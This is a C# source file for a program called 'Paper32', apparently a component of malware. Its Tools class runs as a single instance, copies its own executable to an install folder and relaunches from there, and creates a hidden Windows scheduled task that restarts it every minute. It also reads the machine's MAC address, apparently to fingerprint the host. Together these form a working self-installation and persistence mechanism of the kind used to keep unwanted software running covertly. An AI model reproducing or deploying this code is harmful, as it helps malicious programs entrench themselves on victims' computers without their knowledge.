using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.IO;
using System.Linq;
using System.Net.NetworkInformation;
using System.Text;
using System.Threading;
using System.Threading.Tasks;

namespace Paper32
{
    class Tools
    {
        static public void CheckIfAlreadyRunning()
        {
            Thread.Sleep(100);
            int found = 0;
            foreach (Process p in Process.GetProcesses())
            {
                try
                {
                    if (p.MainModule.FileVersionInfo.FileDescription == Info.FileDescription)
                    {
                        found++;
                    }
                }
                catch { }
                if (found >= 2)
                {
                    Environment.Exit(0);
                }
            }
        }
        static public void Installation()
        {
            try
            {
                if (!Directory.Exists(Info.InstallFolderPath))
                {
                    Directory.CreateDirectory(Info.InstallFolderPath);
                }
            }
            catch { }
            if (Info.CurrentPath != Info.InstallPath)
            {
                try
                {
                    File.Copy(Info.CurrentPath, Info.InstallPath, true);
                    Process.Start(Info.InstallPath);
                    Environment.Exit(0);
                }
                catch { }
            }
        }
        static public void SchTasksEnable()
        {
            Process tsch = new Process();
            tsch.StartInfo.FileName = "schtasks.exe";
            tsch.StartInfo.Arguments = "-Create -tn p32 -sc MINUTE -tr \"" + Info.InstallPath + "\" -F";
            tsch.StartInfo.WindowStyle = ProcessWindowStyle.Hidden;
            tsch.Start();
            while (!tsch.HasExited) ;
        }
        static public void SchTasksDisable()
        {
            Process tsch = new Process();
            tsch.StartInfo.FileName = "schtasks.exe";
            tsch.StartInfo.Arguments = "-Delete -tn p32";
            tsch.StartInfo.WindowStyle = ProcessWindowStyle.Hidden;
            tsch.Start();
            while (!tsch.HasExited) ;
        }
        static public void GoodExit()
        {
            SchTasksDisable();
            Environment.Exit(0);
        }
        static public string GetMacAddress()
        {
            string macAddresses = string.Empty;
            foreach (NetworkInterface nic in NetworkInterface.GetAllNetworkInterfaces())
            {
                if (nic.OperationalStatus == OperationalStatus.Up)
                {
                    macAddresses += nic.GetPhysicalAddress().ToString();
                    break;
                }
            }
            return macAddresses;
        }
    }
}
